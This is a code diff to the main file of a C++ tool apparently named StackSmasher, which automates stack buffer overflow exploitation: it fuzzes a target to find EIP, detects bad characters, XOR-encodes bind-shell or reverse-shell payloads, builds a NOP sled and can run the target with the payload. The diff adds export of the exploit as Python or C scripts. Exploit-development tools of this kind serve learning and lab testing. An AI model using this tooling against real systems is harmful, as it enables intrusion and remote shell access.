@@ -7,6 +7,9 @@
 #include "Payloads/BindShell/BindShell.hpp"
 #include "Payloads/ReverseShell/ReverseShell.hpp"
 #include "Payloads/Shutdown/Shutdown.hpp"
+#include "Script/Script.hpp"
+#include "Script/Python/Python.hpp"
+#include "Script/C/C.hpp"
 #include "Encoder/XorEncoder.hpp"
 #include "Stages/Fuzzer/Fuzzer.hpp"
 #include "Stages/BadCharacters/BadCharacters.hpp"
@@ -28,7 +31,14 @@ int main(int argc, char* argv[])
     program.add_argument("-n", "--nops").help("The number of NOPs to put in the NOP sled before the shell.").nargs(1).default_value(20).action([](const std::string& value) { return std::stoi(value); });
     program.add_argument("-q", "--quiet").help("Do not print the start header.").default_value(false).implicit_value(true);
     program.add_argument("-e", "--exploit").help("Automatically run the full payload against the application.").default_value(false).implicit_value(true);
-    program.add_argument("--python").help("Print the exploit as a python script.").default_value(false).implicit_value(true);
+    program.add_argument("-s", "--script").help("Save the exploit as a script for the given language. [python, python-inline, c]").nargs(1).default_value(std::string("")).action([](const std::string& value) {
+        static const std::vector<std::string> choices = { "python", "python-inline", "c" };
+        if (std::find(choices.begin(), choices.end(), value) != choices.end()) {
+            return value;
+        }
+        return std::string("");
+    });
+    program.add_argument("-sf", "--script-filename").help("The filename without extension the script should be saved as if --script is passed.").nargs(1).default_value(std::string(""));
     program.add_argument("--binary").help("The binary the application should execute if a built-in payload is selected.").nargs(1).default_value(std::string("/bin/sh"));
     program.add_argument("--shell-ip").help("The IP address a reverse shell should connect to.").nargs(1).default_value(std::string("127.0.0.1"));
     program.add_argument("--shell-port").help("The port number a bind shoud listen on or a reverse shell should connect to.").nargs(1).default_value(1337).action([](const std::string& value) { return std::stoi(value); });
@@ -48,7 +58,7 @@ int main(int argc, char* argv[])
 
     Log::verbose = (VerbosityLevel)program.get<int>("--verbose");
     Log::colour = program["--no-colour"] == false;
-    std::string application = program.get<std::string>("application");
+    Application::name = program.get<std::string>("application");
 
     // Header
     if (program["--quiet"] == false)
@@ -59,7 +69,7 @@ int main(int argc, char* argv[])
         std::cout << (Log::colour ? LOG_COLOUR_BLUE : "") << " ___/ / /_/ /_/ / /__/ ,<  " << (Log::colour ? LOG_COLOUR_GREEN : "") << "___/ / / / / / / /_/ (__  ) / / /  __/ /    " << std::endl;
         std::cout << (Log::colour ? LOG_COLOUR_BLUE : "") << "/____/\\__/\\__,_/\\___/_/|_|" << (Log::colour ? LOG_COLOUR_GREEN : "") << "/____/_/ /_/ /_/\\__,_/____/_/ /_/\\___/_/     " << std::endl;
         std::cout << (Log::colour ? LOG_COLOUR_NONE : "") << "                                                                       " << std::endl;
-        std::cout << "                    By https://github.com/McCaulay                     " << std::endl << std::endl;
+        std::cout << "                    By https://github.com/" << (Log::colour ? LOG_COLOUR_PURPLE : "") << "McCaulay" << (Log::colour ? LOG_COLOUR_NONE : "") << "                     " << std::endl << std::endl;
     }
 
     // Ensure ASLR is disabled
@@ -70,7 +80,6 @@ int main(int argc, char* argv[])
     }
 
     // Payload variables
-    std::string shell = "";
     size_t rawPayloadSize = 0;
     uint8_t* rawPayload = nullptr;
 
@@ -100,28 +109,39 @@ int main(int argc, char* argv[])
     }
 
     // Run the fuzzer to find EIP
-    if (!Fuzzer::run(application))
+    if (!Fuzzer::run(Application::name))
         return 5;
 
     // Find bad characters
     if (program["--skip-encoding"] == false)
     {
-        if (!BadCharacters::run(application))
+        if (!BadCharacters::run(Application::name))
             return 5;
 
         // Encode shell
         Log::info(VerbosityLevel::Standard, "XOR encoding payload...\n");
-        shell = XorEncoder::encode(rawPayload, rawPayloadSize, Application::badCharacters.data(), Application::badCharacters.size());
+        Application::shell = XorEncoder::encode(rawPayload, rawPayloadSize, Application::badCharacters.data(), Application::badCharacters.size());
     }
     else
-        shell = std::string((char*)rawPayload, rawPayloadSize);
+        Application::shell = std::string((char*)rawPayload, rawPayloadSize);
 
     // Free raw payload
     free(rawPayload);
     rawPayload = nullptr;
 
+    // Setup the scripter if provided.
+    Script* scripter = nullptr;
+    std::string script = program.get<std::string>("--script");
+    if (!script.empty())
+    {
+        if (script == "python")
+            scripter = new Python();
+        else if (script == "c")
+            scripter = new C();
+    }
+
     // Build payload
-    Payload* payloadBuilder = Payload::builder()
+    Payload* payloadBuilder = Payload::builder(scripter)
         ->padding()
         ->eip();
 
@@ -130,27 +150,22 @@ int main(int argc, char* argv[])
     if (nops > 0)
         payloadBuilder->nopSled(nops);
 
-    payloadBuilder->append(shell);
+    payloadBuilder->payload(Application::shell);
     std::string payload = payloadBuilder->get();
     delete payloadBuilder;
 
-    // Output python command
-    if (program["--python"] == true)
+    // Save script to file
+    if (scripter != nullptr)
     {
-        std::string python = "";
-        for (uint32_t i = 0; i < payload.length(); i++)
-        {
-            char buffer[5];
-            sprintf(buffer, "\\x%02x", (uint8_t)(payload[i]));
-            python += std::string(buffer);
-        }
-        Log::success(VerbosityLevel::Standard, "[%i bytes] python -c 'print(\"%s\")'\n", payload.length(), python.c_str());
+        scripter->save(program.get<std::string>("--script-filename"));
+        delete scripter;
     }
 
+    // Run the exploit
     if (program["--exploit"] == true)
     {
         Log::success(VerbosityLevel::Standard, "Executing application with payload...\n_________________________________________\n\n");
-        Process::exec(application, { payload });
+        Process::exec(Application::name, { payload });
     }
     return 0;
 }
